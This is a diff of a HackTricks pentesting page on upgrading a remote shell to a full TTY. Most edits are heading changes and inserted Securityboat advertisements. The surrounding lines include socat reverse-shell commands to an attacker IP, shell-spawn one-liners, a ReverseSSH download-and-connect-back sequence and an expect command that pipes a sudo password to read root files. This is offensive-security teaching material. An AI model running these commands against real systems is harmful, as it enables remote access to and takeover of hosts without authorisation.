@@ -1,4 +1,4 @@
-
+# Full TTYs
 
 <details>
 
@@ -16,8 +16,14 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
+_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
 
-# Full TTY
+{% embed url="https://securityboat.in/contact-us" %}
+{% endhint %}
+
+## Full TTY
 
 Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found the /etc/shells file This incident has been reported`. Also note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
 
@@ -39,7 +45,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
-## **Spawn shells**
+### **Spawn shells**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -54,7 +60,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 * vi: `:set shell=/bin/bash:shell`
 * nmap: `!sh`
 
-# ReverseSSH
+## ReverseSSH
 
 A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.
 
@@ -69,7 +75,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 /dev/shm/reverse-ssh -v -l -p 4444
 ```
 
-* \(2a\) Linux target:
+* (2a) Linux target:
 
 ```bash
 # Drop it via your preferred way, e.g.
@@ -78,7 +84,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 /dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
 ```
 
-* \(2b\) Windows 10 target \(for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)\):
+* (2b) Windows 10 target (for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)):
 
 ```bash
 # Drop it via your preferred way, e.g.
@@ -97,7 +103,7 @@ ssh -p 8888 127.0.0.1
 sftp -P 8888 127.0.0.1
 ```
 
-# No TTY
+## No TTY
 
 If for some reason you cannot obtain a full TTY you **still can interact with programs** that expects user input. In the following example, the password is passed to `sudo` to read a file:
 
@@ -105,7 +111,12 @@ If for some reason you cannot obtain a full TTY you **still can interact with pr
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
+_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
 
+{% embed url="https://securityboat.in/contact-us" %}
+{% endhint %}
 
 <details>
 
@@ -122,5 +133,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
